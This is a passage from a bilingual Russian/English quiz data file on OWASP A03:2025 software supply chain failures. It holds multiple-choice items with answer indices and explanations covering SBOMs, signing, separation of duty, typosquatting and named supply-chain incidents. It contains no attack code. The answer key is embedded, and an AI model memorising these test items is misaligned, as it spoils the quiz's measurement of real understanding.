          M('была обычной фишинговой атакой', 'was an ordinary phishing attack'),
        ],
        ans: 2,
        e: M('Bybit ($1.5 млрд, 2025) иллюстрирует условно-срабатывающий backdoor: вредоносный код активировался только при использовании конкретного целевого кошелька.', 'Bybit ($1.5B, 2025) illustrates a conditionally triggered backdoor: malicious code activated only when a specific target wallet was used.'),
      },
      {
        q: M('Struts2 RCE (CVE-2017-5638), связанный со взломом Equifax, — пример:', 'The Struts2 RCE (CVE-2017-5638), linked to the Equifax breach, is an example of:'),
        opts: [
          M('misconfiguration', 'misconfiguration'),
          M('social engineering', 'social engineering'),
          M('DDoS', 'DDoS'),
          M('известной уязвимости в широко используемом компоненте (framework)', 'a known vulnerability in a widely used component (framework)'),
        ],
        ans: 3,
        e: M('CVE-2017-5638 в Apache Struts2 — известная уязвимость популярного framework, использованная при взломе Equifax; типичный сценарий «vulnerable component» в A03.', 'CVE-2017-5638 in Apache Struts2 is a known vulnerability in a popular framework used in the Equifax breach — a classic vulnerable-component scenario under A03.'),
      },
      {
        q: M('Почему «separation of duty» в CI/CD важна для supply chain security?', 'Why does "separation of duty" in CI/CD matter for supply chain security?'),
        opts: [
          M('Ни один человек не может единолично написать код и продвинуть его в прод без независимого ревью — снижает риск инсайдерской или скомпрометированной учётки атаки', 'No single person can unilaterally write code and push it to prod without independent review — reducing insider or compromised-account attack risk'),
          M('Ускоряет релизы', 'It speeds up releases'),
          M('Не влияет на безопасность', 'It doesn\'t affect security'),
          M('Требуется только для финансовых организаций', 'It\'s only required for financial organizations'),
        ],
        ans: 0,
        e: M('Separation of duty не даёт одному человеку единолично провести код от коммита до прода без независимого ревью, снижая риск инсайдера или скомпрометированной учётки.', 'Separation of duty prevents one person from unilaterally moving code from commit to production without independent review, reducing insider or compromised-account risk.'),
      },
      {
        q: M('Retire.js и OWASP Dependency-Check — инструменты для:', 'Retire.js and OWASP Dependency-Check are tools for:'),
        opts: [
          M('сканирования сети', 'network scanning'),
          M('обнаружения известных уязвимых версий клиентских/серверных библиотек', 'detecting known-vulnerable versions of client-/server-side libraries'),
          M('тестирования производительности', 'performance testing'),
          M('генерации паролей', 'password generation'),
        ],
        ans: 1,
        e: M('Retire.js и OWASP Dependency-Check сканируют клиентские и серверные библиотеки на известные уязвимые версии — ключевой инструмент composition analysis для A03.', 'Retire.js and OWASP Dependency-Check scan client- and server-side libraries for known-vulnerable versions — core composition-analysis tools for A03.'),
      },
      {
        q: M('Подписанные артефакты (signed packages/builds) помогают предотвратить:', 'Signed artifacts (signed packages/builds) help prevent:'),
        opts: [
          M('CSRF', 'CSRF'),
          M('утечку памяти', 'memory leaks'),
          M('подмену/модификацию пакета злоумышленником при распространении (integrity failure в supply chain)', 'tampering with/modifying a package by an attacker during distribution (a supply-chain integrity failure)'),
          M('SQL-инъекции', 'SQL injection'),
        ],
        ans: 2,
        e: M('Цифровая подпись артефактов помогает обнаружить подмену пакета при распространении: целостность нарушается, если злоумышленник изменил сборку без валидной подписи.', 'Signed artifacts help detect package tampering during distribution: integrity fails if an attacker modifies a build without a valid signature.'),
      },
      {
        q: M('Что из перечисленного — признак того, что вы уязвимы к A03 согласно OWASP?', 'Which of the following is a sign you\'re exposed to A03 per OWASP?'),
        opts: [
          M('Вы применяете MFA везде', 'You apply MFA everywhere'),
          M('Вы регулярно проводите пентесты', 'You run regular pentests'),
          M('Вы используете WAF', 'You use a WAF'),
          M('Вы не отслеживаете версии компонентов, включая транзитивные зависимости', 'You don\'t track component versions, including transitive dependencies'),
        ],
        ans: 3,
        e: M('По OWASP, признак уязвимости к A03 — отсутствие инвентаризации версий компонентов, включая транзитивные зависимости на клиенте и сервере.', 'Per OWASP, a sign of A03 exposure is not tracking component versions, including transitive dependencies on client and server.'),
      },
      {
        q: M('PhantomRaven (npm, 2025) — это:', 'PhantomRaven (npm, 2025) was:'),
        opts: [
          M('вредоносная кампания, обнаруженная в 126+ npm-пакетах', 'a malicious campaign discovered in 126+ npm packages'),
          M('уязвимость в браузере Chrome', 'a Chrome browser vulnerability'),
          M('уязвимость конфигурации Kubernetes', 'a Kubernetes configuration flaw'),
          M('фишинговая атака на разработчиков через email', 'a phishing attack targeting developers via email'),
        ],
        ans: 0,
        e: M('PhantomRaven (npm, 2025) — вредоносная кампания, обнаруженная в более чем 126 npm-пакетах, пример компрометации экосистемы реестра пакетов.', 'PhantomRaven (npm, 2025) was a malicious campaign found in 126+ npm packages — an example of package-registry ecosystem compromise.'),
      },
      {
        q: M('Glassworm (2025) распространялся через:', 'Glassworm (2025) spread via:'),
        opts: [
          M('уязвимость в SSH', 'an SSH vulnerability'),
          M('расширения VS Code Marketplace (самораспространяющийся червь)', 'VS Code Marketplace extensions (a self-propagating worm)'),
          M('уязвимость в PostgreSQL', 'a PostgreSQL vulnerability'),
          M('уязвимость Docker Hub', 'a Docker Hub vulnerability'),
        ],
        ans: 1,
        e: M('Glassworm (2025) распространялся через расширения VS Code Marketplace как самораспространяющийся червь — атака на developer toolchain в рамках supply chain.', 'Glassworm (2025) spread via VS Code Marketplace extensions as a self-propagating worm — an attack on the developer toolchain within the supply chain.'),
      },
      {
        q: M('Почему организация должна иметь change management процесс для CI/CD настроек, IDE, репозиториев кода?', 'Why should an organization have a change-management process for CI/CD settings, IDEs, and code repositories?'),
        opts: [
          M('Это требуется только для крупных enterprise-компаний', 'It\'s only required for large enterprises'),
          M('Не влияет на безопасность, только на удобство', 'It doesn\'t affect security, only convenience'),
          M('Позволяет отслеживать и аудировать изменения в каждой части supply chain, включая обнаружение несанкционированных модификаций', 'It enables tracking and auditing changes across every part of the supply chain, including detecting unauthorized modifications'),
          M('Требуется исключительно для соответствия ISO 9001', 'It\'s required solely for ISO 9001 compliance'),
        ],
        ans: 2,
        e: M('Change management для CI/CD, IDE и репозиториев позволяет аудировать изменения по всей supply chain и выявлять несанкционированные модификации конфигурации.', 'Change management for CI/CD, IDEs, and repos enables auditing changes across the supply chain and detecting unauthorized configuration modifications.'),
      },
      {
        q: M('CWE-1104 в списке A03:2025 обозначает:', 'CWE-1104 in the A03:2025 list refers to:'),
        opts: [
          M('SQL Injection', 'SQL Injection'),
          M('Missing Authentication', 'Missing Authentication'),
          M('Cross-Site Scripting', 'Cross-Site Scripting'),
          M('Use of Unmaintained Third Party Components', 'Use of Unmaintained Third Party Components'),
        ],
        ans: 3,
        e: M('CWE-1104 в списке A03:2025 — Use of Unmaintained Third Party Components: использование сторонних компонентов без поддержки вендора.', 'CWE-1104 in the A03:2025 list is Use of Unmaintained Third Party Components — relying on third-party components that lack vendor support.'),
      },
      {
        q: M('Что из следующего — верная стратегия при обнаружении неподдерживаемой (unmaintained) библиотеки в проекте, для которой нет патчей?', 'What\'s the right strategy when an unmaintained library with no available patches is found in a project?'),
        opts: [
          M('Мигрировать на альтернативу или, если невозможно — развернуть виртуальный патч для мониторинга/защиты', 'Migrate to an alternative or, if impossible, deploy a virtual patch to monitor/protect it'),
          M('Игнорировать проблему', 'Ignore the issue'),
          M('Удалить всё приложение', 'Delete the entire application'),
          M('Продолжать использовать без изменений навсегда', 'Keep using it unchanged forever'),
        ],
        ans: 0,
        e: M('Для unmaintained-библиотеки без патчей OWASP рекомендует миграцию на альтернативу или, если это невозможно, virtual patch с мониторингом и защитой.', 'For an unmaintained library with no patches, OWASP recommends migrating to an alternative or, if that is impossible, a virtual patch with monitoring and protection.'),
      },
      {
        q: M('Компоненты (библиотеки/фреймворки) в приложении обычно исполняются:', 'Components (libraries/frameworks) in an application typically execute:'),
        opts: [
          M('в изолированной песочнице без доступа к данным приложения', 'in an isolated sandbox with no access to app data'),
          M('с теми же привилегиями, что и само приложение — поэтому их компрометация равна компрометации приложения', 'with the same privileges as the application itself — so compromising them equals compromising the app'),
          M('в отдельном контейнере всегда по умолчанию', 'always in a separate container by default'),
          M('только в режиме чтения', 'read-only mode only'),
        ],
        ans: 1,
        e: M('Библиотеки и frameworks обычно работают с теми же привилегиями, что и приложение, поэтому компрометация зависимости равносильна компрометации самого приложения.', 'Libraries and frameworks typically run with the same privileges as the application, so compromising a dependency equals compromising the app itself.'),
      },
      {
        q: M('Что из перечисленного относится к «hardening» build-сервера/CI-CD согласно OWASP-рекомендациям?', 'Which of the following is part of OWASP\'s recommended CI/CD build-server hardening?'),
        opts: [
          M('Отключение логирования для скорости', 'Disabling logging for speed'),
          M('Общий аккаунт для всех разработчиков', 'A shared account for all developers'),
          M('Разделение обязанностей, контроль доступа, подписанные сборки, tamper-evident логи, environment-scoped секреты', 'Separation of duties, access control, signed builds, tamper-evident logs, environment-scoped secrets'),
          M('Хранение секретов в открытом виде в репозитории для удобства', 'Storing secrets in plaintext in the repo for convenience'),
        ],
        ans: 2,
        e: M('Hardening CI/CD по OWASP включает separation of duties, контроль доступа, подписанные сборки, tamper-evident логи и environment-scoped секреты.', 'OWASP CI/CD hardening includes separation of duties, access control, signed builds, tamper-evident logs, and environment-scoped secrets.'),
      },
      {
        q: M('Почему организациям рекомендуется намеренно выбирать конкретную версию зависимости, а не автоматически подтягивать «latest»?', 'Why is it recommended to deliberately pin a specific dependency version instead of automatically pulling "latest"?'),
        opts: [
          M('Не имеет значения для безопасности', 'It doesn\'t matter for security'),
          M('Latest всегда безопаснее', 'Latest is always safer'),
          M('Latest версии всегда медленнее', 'Latest versions are always slower'),
          M('Контролируемое, осознанное обновление снижает риск неожиданного получения скомпрометированной/несовместимой версии', 'A controlled, deliberate upgrade reduces the risk of unexpectedly getting a compromised/incompatible version'),
        ],
        ans: 3,
        e: M('Pin конкретной версии вместо «latest» даёт контролируемое обновление: меньше риска внезапно получить скомпрометированную или несовместимую версию зависимости.', 'Pinning a specific version instead of "latest" enables controlled upgrades and reduces the risk of unexpectedly pulling a compromised or incompatible dependency.'),
      },
      {
        q: M('Container registry (например, Docker Hub) без строгого контроля образов представляет риск, потому что:', 'A container registry (e.g., Docker Hub) without strict image control is risky because:'),
        opts: [
          M('вредоносный или устаревший образ с уязвимостями может быть незаметно использован в production', 'a malicious or outdated image with vulnerabilities can be silently used in production'),
          M('занимает много места', 'it takes up too much space'),
          M('требует лицензии', 'it requires a license'),
          M('снижает скорость сборки', 'it slows down builds'),
        ],
        ans: 0,
        e: M('Без строгого контроля образов в registry (Docker Hub и др.) вредоносный или устаревший образ с уязвимостями может незаметно попасть в production.', 'Without strict image control in a registry (e.g., Docker Hub), a malicious or outdated vulnerable image can silently be used in production.'),
      },
      {
        q: M('Средний incidence rate для A03:2025 (при обнаружении) оказался:', 'The average incidence rate for A03:2025 (when found) turned out to be:'),
        opts: [
          M('самым низким среди всех категорий', 'the lowest among all categories'),
          M('самым высоким среди всех категорий (5.72%), несмотря на малое число CVE в датасете', 'the highest among all categories (5.72%), despite few CVEs in the dataset'),
          M('не поддаётся измерению', 'unmeasurable'),
          M('равен нулю', 'zero'),
        ],
        ans: 1,
        e: M('При обнаружении A03 показывает самый высокий средний incidence rate среди категорий OWASP Top 10:2025 — 5.72%, несмотря на малое число CVE в датасете.', 'When found, A03 has the highest average incidence rate among OWASP Top 10:2025 categories — 5.72% — despite few CVEs in the dataset.'),
      },
      {
        q: M('Что из перечисленного правильно описывает связь между A03 и A08 (Software/Data Integrity Failures)?', 'Which of the following correctly describes the relationship between A03 and A08 (Software/Data Integrity Failures)?'),
        opts: [
          M('A08 относится только к базам данных', 'A08 applies only to databases'),
          M('Это одно и то же', 'They\'re the same thing'),
          M('A03 — про весь процесс/экосистему supply chain, A08 — про верификацию целостности конкретного артефакта/данных на более низком уровне', 'A03 covers the entire supply chain process/ecosystem, A08 covers verifying the integrity of a specific artifact/data at a lower level'),
          M('Они не связаны', 'They\'re unrelated'),
        ],
        ans: 2,
        e: M('A03 охватывает всю экосистему supply chain (сборка, доставка, зависимости), а A08 — верификацию целостности конкретного артефакта или данных на более низком уровне.', 'A03 covers the whole supply-chain ecosystem (build, delivery, dependencies), while A08 covers verifying integrity of a specific artifact or data at a lower level.'),
      },
      {
        q: M('Какая мера НЕ относится к рекомендациям OWASP по A03?', 'Which measure is NOT one of OWASP\'s A03 recommendations?'),
        opts: [
          M('Ведение SBOM', 'Maintaining an SBOM'),
          M('Использование только компонентов из официальных источников по защищённым каналам', 'Using only components from official sources over trusted channels'),
          M('Мониторинг CVE/NVD/OSV баз для используемых компонентов', 'Monitoring CVE/NVD/OSV databases for the components in use'),
          M('Игнорирование security bulletins для экономии времени', 'Ignoring security bulletins to save time'),
        ],
        ans: 3,
        e: M('Игнорирование security bulletins — антипаттерн, а не рекомендация; OWASP, напротив, требует регулярного мониторинга bulletins и сканирования уязвимостей.', 'Ignoring security bulletins is an anti-pattern, not a recommendation; OWASP instead requires regular bulletin monitoring and vulnerability scanning.'),
      },
      {
        q: M('Что из перечисленного — пример правильного patch management процесса?', 'Which of the following is an example of a proper patch management process?'),
        opts: [
          M('Риск-ориентированное, своевременное обновление платформы/фреймворков/зависимостей', 'Risk-based, timely updates to the platform/frameworks/dependencies'),
          M('Патчинг раз в квартал по расписанию независимо от критичности CVE', 'Patching quarterly on a fixed schedule regardless of severity'),
          M('Отказ от патчинга вообще для стабильности', 'Never patching at all, for stability'),
          M('Патчинг только после инцидента', 'Patching only after an incident'),
        ],
        ans: 0,
        e: M('Правильный patch management — риск-ориентированное и своевременное обновление платформы, frameworks и зависимостей с учётом критичности уязвимостей.', 'Proper patch management is risk-based, timely updating of the platform, frameworks, and dependencies according to vulnerability severity.'),
      },
      {
        q: M('Почему тестирование совместимости обновлённых/пропатченных библиотек важно перед деплоем?', 'Why does compatibility testing of patched/updated libraries matter before deployment?'),
        opts: [
          M('Не важно, патчи всегда совместимы', 'It doesn\'t matter, patches are always compatible'),
          M('Обновление может сломать функциональность приложения, что заставляет команды откладывать критичные патчи безопасности', 'An update can break functionality, causing teams to delay critical security patches'),
          M('Требуется только для мобильных приложений', 'Required only for mobile apps'),
          M('Тестирование замедляет разработку без пользы', 'Testing slows development for no benefit'),
        ],
        ans: 1,
        e: M('Совместимость патчей нужно проверять до деплоя: поломка функциональности заставляет откладывать критичные обновления безопасности и продлевает окно эксплуатации.', 'Compatibility must be tested before deploy: broken functionality makes teams delay critical security patches and extends the exploitation window.'),
      },
      {
        q: M('Атаки на npm/PyPI через тайпсквоттинг (typosquatting, например reqeusts вместо requests) относятся к:', 'Typosquatting attacks on npm/PyPI (e.g., reqeusts instead of requests) are:'),
        opts: [
          M('misconfiguration', 'misconfiguration'),
          M('CSRF', 'CSRF'),
          M('supply chain атаке через вредоносный пакет со схожим именем', 'a supply chain attack via a malicious similarly-named package'),
          M('SQL Injection', 'SQL Injection'),
        ],
        ans: 2,
        e: M('Typosquatting (например, reqeusts вместо requests) — supply chain-атака: вредоносный пакет со схожим именем устанавливается по ошибке вместо легитимного.', 'Typosquatting (e.g., reqeusts instead of requests) is a supply-chain attack: a malicious similarly named package is installed by mistake instead of the legitimate one.'),
      },
      {
        q: M('Какой инструмент, упомянутый в OWASP-рекомендациях A03, используется для управления и трекинга SBOM?', 'Which tool, mentioned in OWASP\'s A03 guidance, is used for SBOM management and tracking?'),
        opts: [
          M('sqlmap', 'sqlmap'),
          M('Metasploit', 'Metasploit'),
          M('Burp Suite', 'Burp Suite'),
          M('OWASP Dependency-Track', 'OWASP Dependency-Track'),
        ],
        ans: 3,
        e: M('OWASP Dependency-Track упомянут в рекомендациях A03 как инструмент управления SBOM и непрерывного отслеживания уязвимостей зависимостей.', 'OWASP Dependency-Track is cited in A03 guidance as a tool for SBOM management and continuous dependency vulnerability tracking.'),
      },
      {
        q: M('Почему «CI/CD пайплайн со слабой защитой, чем системы, которые он собирает и деплоит» считается признаком уязвимости к A03?', 'Why is "a CI/CD pipeline with weaker protections than the systems it builds and deploys" considered a sign of A03 exposure?'),
        opts: [
          M('CI/CD имеет доступ ко всему коду и секретам — если он менее защищён, чем прод, это создаёт более лёгкую точку входа к компрометации всего, что он собирает', 'CI/CD has access to all code and secrets — if it\'s less protected than prod, it becomes an easier entry point to compromise everything it builds'),
          M('CI/CD никогда не хранит секреты', 'CI/CD never stores secrets'),
          M('Это не относится к supply chain', 'It\'s unrelated to supply chain'),
          M('Не является риском', 'It\'s not a risk'),
        ],
        ans: 0,
        e: M('CI/CD имеет доступ к коду и секретам; если пайплайн слабее прода, он становится лёгкой точкой входа для компрометации всего, что собирается и деплоится.', 'CI/CD has access to code and secrets; if the pipeline is weaker than production, it becomes an easy entry point to compromise everything it builds and deploys.'),
      },
      {
        q: M('Что из следующего — верное про CWE-1395 (Dependency on Vulnerable Third-Party Component)?', 'Which is true about CWE-1395 (Dependency on Vulnerable Third-Party Component)?'),
        opts: [
          M('Относится к SQL-инъекции', 'It relates to SQL injection'),
          M('Относится к использованию компонента с известной уязвимостью, что напрямую связано с A03', 'It relates to using a component with a known vulnerability, directly connected to A03'),
          M('Относится к проблемам аутентификации', 'It relates to authentication issues'),
          M('Относится к XSS', 'It relates to XSS'),
        ],
        ans: 1,
        e: M('CWE-1395 (Dependency on Vulnerable Third-Party Component) описывает использование компонента с известной уязвимостью — напрямую связано с сутью A03.', 'CWE-1395 (Dependency on Vulnerable Third-Party Component) describes using a component with a known vulnerability — directly tied to A03.'),
      },
      {
        q: M('Согласно OWASP, кто должен иметь возможность единолично провести код от коммита до продакшена без независимого ревью?', 'Per OWASP, who should be able to unilaterally take code from commit to production without independent review?'),
        opts: [
          M('DevOps-инженер', 'A DevOps engineer'),
          M('Любой senior-разработчик', 'Any senior developer'),
          M('Никто — необходимо разделение обязанностей (separation of duty)', 'No one — separation of duty is required'),
          M('Тимлид', 'The team lead'),
        ],
        ans: 2,
        e: M('По OWASP никто не должен единолично проводить код от коммита до production без независимого ревью — обязательно separation of duty.', 'Per OWASP, no one should unilaterally take code from commit to production without independent review — separation of duty is required.'),
      },
      {
        q: M('Почему организациям рекомендуется избегать одновременного (не поэтапного) развёртывания обновлений на всю инфраструктуру?', 'Why is it recommended to avoid deploying updates simultaneously to the entire infrastructure at once?'),
        opts: [
          M('Одновременное развёртывание всегда быстрее', 'Simultaneous deployment is always faster'),
          M('Не имеет значения для безопасности', 'It doesn\'t matter for security'),
          M('Это требует больше серверов', 'It requires more servers'),
          M('Если обновление от доверенного вендора скомпрометировано, поэтапный/canary rollout ограничивает масштаб ущерба до его обнаружения', 'If a trusted vendor\'s update turns out compromised, a staged/canary rollout limits the blast radius before detection'),
        ],
        ans: 3,
        e: M('Одновременный деплой обновления на всю инфраструктуру опасен: при компрометации вендора staged/canary rollout ограничивает масштаб ущерба до обнаружения.', 'Deploying an update fleet-wide at once is risky: if a vendor is compromised, staged/canary rollout limits blast radius until detection.'),
      },
      {
        q: M('Reliance on Component That is Not Updateable (CWE-1329) описывает риск:', 'Reliance on Component That is Not Updateable (CWE-1329) describes the risk of:'),
        opts: [
          M('использования компонента, который невозможно обновить/пропатчить при обнаружении уязвимости', 'using a component that cannot be updated/patched when a vulnerability is discovered'),
          M('неправильной аутентификации', 'improper authentication'),
          M('Не относится к данному классу уязвимостей', 'Does not belong to this vulnerability class'),
          M('утечки памяти', 'a memory leak'),
        ],
        ans: 0,
        e: M('CWE-1329 — Reliance on Component That is Not Updateable: риск использования компонента, который нельзя обновить или пропатчить при появлении уязвимости.', 'CWE-1329 — Reliance on Component That is Not Updateable: the risk of using a component that cannot be updated or patched when a vulnerability is found.'),
      },
      {
        q: M('Какая практика ближе всего к «Zero Trust» применительно к supply chain?', 'Which practice is closest to "Zero Trust" as applied to the supply chain?'),
        opts: [
          M('Автоматически доверять всем обновлениям от «известных» вендоров без верификации', 'Automatically trust all updates from "known" vendors without verification'),
          M('Верифицировать происхождение (provenance) и подпись каждого артефакта независимо от источника', 'Verify the provenance and signature of every artifact regardless of source'),
          M('Доверять всем open-source библиотекам без проверки', 'Trust all open-source libraries without checking'),
          M('Отключить проверку подписи для ускорения сборки', 'Disable signature verification to speed up builds'),
        ],
        ans: 1,
        e: M('Zero Trust для supply chain означает не доверять источнику по умолчанию: проверять provenance и подпись каждого артефакта независимо от того, откуда он пришёл.', 'Zero Trust for the supply chain means not trusting a source by default: verify provenance and signature of every artifact regardless of origin.'),
      },
      {
        q: M('Что из перечисленного лучше всего описывает «вербовка» скомпрометированного npm-токена разработчика в кампании типа Shai-Hulud?', 'Which of the following best describes the "recruitment" of a developer\'s compromised npm token in a campaign like Shai-Hulud?'),
        opts: [
          M('Токен использовался только для чтения публичных пакетов', 'The token was used only to read public packages'),
          M('Токен был немедленно отозван самим npm автоматически', 'The token was immediately revoked automatically by npm'),
          M('Найденный на скомпрометированной машине npm-токен автоматически использовался для публикации вредоносных версий любых доступных пакетов жертвы, распространяя червя дальше', 'An npm token found on a compromised machine was automatically used to publish malicious versions of any package the victim had access to, spreading the worm further'),
          M('Токены не были задействованы в этой атаке', 'Tokens weren\'t involved in this attack'),
        ],
        ans: 2,
        e: M('В кампаниях вроде Shai-Hulud украденный npm-токен автоматически публиковал вредоносные версии пакетов жертвы, «рекрутируя» её аккаунт для дальнейшего распространения червя.', 'In campaigns like Shai-Hulud, a stolen npm token automatically published malicious versions of the victim\'s packages, "recruiting" the account to spread the worm further.'),
      },
      {
        q: M('Почему «reduce attack surface» через удаление неиспользуемых зависимостей относится к A03?', 'Why does "reducing attack surface" by removing unused dependencies relate to A03?'),
        opts: [
          M('Не относится, это только про A02', 'It doesn\'t, that\'s only A02'),
          M('Уменьшение зависимостей не влияет на безопасность', 'Reducing dependencies doesn\'t affect security'),
          M('Это только вопрос производительности', 'It\'s purely a performance concern'),
          M('Каждая лишняя зависимость — потенциальная точка входа через её уязвимости, даже если функциональность не используется', 'Every extra dependency is a potential entry point through its own vulnerabilities, even if its functionality is unused'),
        ],
        ans: 3,
        e: M('Каждая лишняя зависимость — дополнительная поверхность атаки через её CVE, даже если функциональность не используется; удаление unused deps снижает риск A03.', 'Every unused dependency is extra attack surface via its CVEs even if features are unused; removing them reduces A03 risk.'),
      },
      {
        q: M('Тип атаки, при котором злоумышленник получает доступ к сборочной инфраструктуре и внедряет вредоносный код до подписания артефакта, называется:', 'An attack where the attacker gains access to build infrastructure and injects malicious code before artifact signing is called:'),
        opts: [
          M('build/CI-CD pipeline compromise (относится к A03/A08)', 'build/CI-CD pipeline compromise (related to A03/A08)'),
          M('session fixation', 'session fixation'),
          M('CSRF', 'CSRF'),
          M('XSS injection', 'XSS injection'),
        ],
        ans: 0,
        e: M('Внедрение вредоносного кода в build-инфраструктуру до подписи артефакта — компрометация CI/CD-пайплайна, относящаяся к A03 (и пересекающаяся с A08).', 'Injecting malicious code into build infrastructure before artifact signing is a CI/CD pipeline compromise related to A03 (and overlapping A08).'),
      },
      {
        q: M('Что из перечисленного — верно про сложность обнаружения supply chain атак?', 'Which of the following is true about the difficulty of detecting supply chain attacks?'),
        opts: [
          M('Такие атаки невозможны при использовании HTTPS', 'Such attacks are impossible when HTTPS is used'),
          M('Они часто эксплуатируют доверие к легитимному источнику (вендору/пакету), из-за чего традиционные средства защиты периметра их не замечают', 'They often exploit trust in a legitimate source (vendor/package), so traditional perimeter defenses don\'t notice them'),
          M('WAF полностью предотвращает такие атаки', 'A WAF fully prevents such attacks'),
          M('Они всегда легко обнаруживаются антивирусом', 'They\'re always easily caught by antivirus'),
        ],
        ans: 1,
        e: M('Supply chain-атаки эксплуатируют доверие к легитимному вендору или пакету, поэтому традиционные средства защиты периметра часто их не замечают.', 'Supply-chain attacks exploit trust in a legitimate vendor or package, so traditional perimeter defenses often fail to notice them.'),
      },
      {
        q: M('Почему мониторинг источников типа CVE/NVD/OSV должен быть непрерывным, а не разовым при внедрении компонента?', 'Why should monitoring sources like CVE/NVD/OSV be continuous rather than a one-time check when a component is adopted?'),
        opts: [
          M('Непрерывный мониторинг не даёт практической пользы', 'Continuous monitoring provides no practical benefit'),
          M('Разовая проверка достаточна навсегда', 'A one-time check is sufficient forever'),
          M('Новые уязвимости в уже используемых компонентах обнаруживаются постоянно после их внедрения в проект', 'New vulnerabilities in already-used components are discovered constantly after adoption'),
          M('NVD обновляется раз в год', 'NVD updates only once a year'),
        ],
        ans: 2,
        e: M('Новые CVE в уже принятых компонентах появляются постоянно, поэтому сверка с CVE/NVD/OSV должна быть непрерывной, а не разовой при внедрении библиотеки.', 'New CVEs in already-adopted components appear continuously, so CVE/NVD/OSV monitoring must be ongoing, not a one-time check at adoption.'),
      },
      {
        q: M('Согласно данным OWASP 2025, категория A03 при этом имеет:', 'Per OWASP 2025 data, category A03 nonetheless has:'),
        opts: [
          M('наибольшее число occurrences и низкий impact', 'the most occurrences and low impact'),
          M('наибольшее число CWE', 'the highest number of CWEs'),
          M('нулевой impact', 'zero impact'),
          M('наименьшее число occurrences в датасете, но самый высокий средний exploit/impact score среди всех категорий', 'the fewest occurrences in the dataset, but the highest average exploit/impact score of all categories'),
        ],
        ans: 3,
        e: M('По данным OWASP 2025, у A03 меньше всего occurrences в датасете, но при этом самый высокий средний exploit/impact score среди всех категорий.', 'Per OWASP 2025 data, A03 has the fewest dataset occurrences yet the highest average exploit/impact score of all categories.'),
      },
      {
        q: M('Что из перечисленного — правильная реакция security-команды на обнаружение Log4Shell-подобной уязвимости в зависимости продакшен-системы?', 'What\'s the correct security-team response when a Log4Shell-like vulnerability is found in a production dependency?'),
        opts: [
          M('Оперативно оценить exposure (где используется компонент), применить патч/митигацию по риск-приоритету, при необходимости — временный virtual patch', 'Promptly assess exposure (where the component is used), apply a risk-prioritized patch/mitigation, and deploy a temporary virtual patch if needed'),
          M('Ждать планового квартального патчинга', 'Wait for the scheduled quarterly patch cycle'),
          M('Игнорировать, если приложение работает стабильно', 'Ignore it if the app is running stably'),
          M('Полностью отключить приложение навсегда', 'Permanently shut down the application'),
        ],
        ans: 0,
        e: M('При Log4Shell-подобной уязвимости нужно оперативно оценить, где компонент используется, применить риск-приоритетный патч/митигацию и при необходимости virtual patch.', 'For a Log4Shell-like issue, promptly assess where the component is used, apply a risk-prioritized patch/mitigation, and add a temporary virtual patch if needed.'),
      },
      {
        q: M('IDE-расширения (например, вредоносное расширение VS Code) как вектор атаки относятся к A03, потому что:', 'IDE extensions (e.g., a malicious VS Code extension) as an attack vector fall under A03 because:'),
        opts: [
          M('не относятся к A03 вообще', 'they\'re unrelated to A03 at all'),
          M('расширения — часть инструментария разработчика (часть supply chain), могут красть секреты/код или внедрять вредоносный код в проекты', 'extensions are part of the developer toolchain (part of the supply chain) and can steal secrets/code or inject malicious code into projects'),
          M('расширения работают только в браузере', 'extensions only run in the browser'),
          M('расширения не имеют доступа к файловой системе', 'extensions have no file-system access'),
        ],
        ans: 1,
        e: M('IDE-расширения — часть developer toolchain и supply chain: вредоносное расширение может красть секреты/код или внедрять вредонос в проекты, поэтому это A03.', 'IDE extensions are part of the developer toolchain and supply chain: a malicious extension can steal secrets/code or inject malware into projects, so they fall under A03.'),
      },
      {
        q: M('Что из перечисленного — верно про происхождение (provenance) артефактов согласно рекомендациям A03?', 'Which is true about artifact provenance per A03 recommendations?'),
        opts: [
          M('Провенанс относится только к аппаратному обеспечению', 'Provenance only applies to hardware'),
          M('Провенанс — устаревшая практика', 'Provenance is an outdated practice'),
          M('Провенанс позволяет проследить, что артефакт собран из ожидаемого source code через ожидаемый, защищённый build-процесс (например, через SLSA framework)', 'Provenance lets you trace that an artifact was built from expected source code through an expected, protected build process (e.g., via the SLSA framework)'),
          M('Не имеет значения, откуда взят артефакт, если он работает', 'It doesn\'t matter where an artifact came from as long as it works'),
        ],
        ans: 2,
        e: M('Provenance (например, в рамках SLSA) позволяет доказать, что артефакт собран из ожидаемого исходного кода через защищённый и ожидаемый build-процесс.', 'Provenance (e.g., via SLSA) proves an artifact was built from expected source code through an expected, protected build process.'),
      },
      {
        q: M('Тайминг атаки Shai-Hulud (успела заразить 500+ версий пакетов до остановки) иллюстрирует:', 'The timeline of the Shai-Hulud attack (infecting 500+ package versions before being stopped) illustrates:'),
        opts: [
          M('отсутствие какого-либо риска для разработчиков', 'no risk to developers whatsoever'),
          M('низкую скорость распространения supply chain атак', 'low propagation speed for supply chain attacks'),
          M('неэффективность npm как платформы в целом', 'npm\'s overall ineffectiveness as a platform'),
          M('способность самораспространяющихся supply chain worm-атак к быстрому масштабированию через доверительные связи в реестрах пакетов', 'the ability of self-propagating supply chain worms to scale rapidly through trust relationships in package registries'),
        ],
        ans: 3,
        e: M('Shai-Hulud успел заразить 500+ версий пакетов до остановки, показывая, как registry-worm быстро масштабируется через доверительные связи в экосистеме пакетов.', 'Shai-Hulud infected 500+ package versions before being stopped, showing how registry worms scale rapidly through trust relationships in package ecosystems.'),
      },
      {
        q: M('Почему «developers themselves are now prime targets» (согласно анализу атаки Shai-Hulud) стало новой тенденцией?', 'Why has "developers themselves are now prime targets" (per analysis of the Shai-Hulud attack) become a new trend?'),
        opts: [
          M('Компрометация машины/токенов разработчика даёт доступ сразу ко множеству проектов и пакетов, которые он поддерживает — эффективный рычаг для supply chain атаки', 'Compromising a developer\'s machine/tokens grants immediate access to many projects and packages they maintain — an efficient lever for a supply chain attack'),
          M('Разработчики никогда не были целью раньше', 'Developers were never targeted before'),
          M('Не связано с A03', 'It\'s unrelated to A03'),
          M('Разработчиков легче обмануть, чем обычных пользователей', 'Developers are easier to fool than regular users'),
        ],
        ans: 0,
        e: M('Компрометация машины или токенов разработчика даёт доступ сразу ко многим проектам и пакетам, которые он поддерживает — эффективный рычаг supply chain-атаки.', 'Compromising a developer\'s machine or tokens grants access to many projects and packages they maintain — an efficient lever for supply-chain attacks.'),
      },
      {
